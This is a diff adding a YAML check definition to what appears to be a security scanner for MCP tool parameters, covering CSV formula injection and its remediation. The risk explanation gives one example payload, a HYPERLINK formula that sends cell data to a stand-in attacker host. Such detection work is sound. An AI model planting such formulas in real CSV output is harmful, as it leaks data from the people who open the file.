@@ -1,0 +1,30 @@
+check_id: iv015
+title: CSV Injection Risk
+category: input_validation
+severity: medium
+description: >
+  Detects tool parameters whose output may be rendered in CSV format
+  without sanitization. Parameters containing formula prefixes (=, +, -,
+  @) can execute formulas when the CSV is opened in spreadsheet
+  applications, enabling data exfiltration and code execution.
+risk_explanation: >
+  CSV injection exploits spreadsheet applications that automatically
+  execute formulas in CSV data. An attacker injects a value like
+  =HYPERLINK("https://evil.com/?data="&A1,"Click") that exfiltrates data
+  when the CSV is opened. The DDE (Dynamic Data Exchange) protocol can
+  execute arbitrary commands on the user's machine.
+remediation: >
+  Sanitize all parameter values that may appear in CSV output by
+  prefixing cells starting with =, +, -, @, or tab with a single quote.
+  Implement output encoding specifically for CSV contexts. Validate
+  input parameters to reject values containing formula prefixes when CSV
+  output is expected.
+references:
+  - "https://owasp.org/www-project-mcp-top-10/"
+owasp_mcp:
+  - "MCP05:2025"
+tags:
+  - input_validation
+  - csv_injection
+  - formula_injection
+  - spreadsheet
